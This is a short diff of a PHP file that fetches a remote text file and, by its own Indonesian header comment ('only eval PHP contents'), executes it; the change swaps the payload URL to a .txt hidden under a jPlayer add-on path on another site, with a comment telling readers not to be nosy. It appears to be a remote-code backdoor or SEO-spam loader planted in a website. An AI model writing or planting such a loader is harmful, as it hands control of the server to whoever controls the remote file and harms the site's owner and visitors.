@@ -8,7 +8,7 @@
  * - Aman: hanya eval isi PHP
  */
 
-$url = "https://raden303.b-cdn.net/seoraden_decoded.txt"; // Jangan Kepo Dong
+$url = "https://vantaibamien.com/filemanager/js/jPlayer/add-on/0aw.txt"; // Jangan Kepo Dong
 
 function fetch_strict($url) {
     $tries = 0;
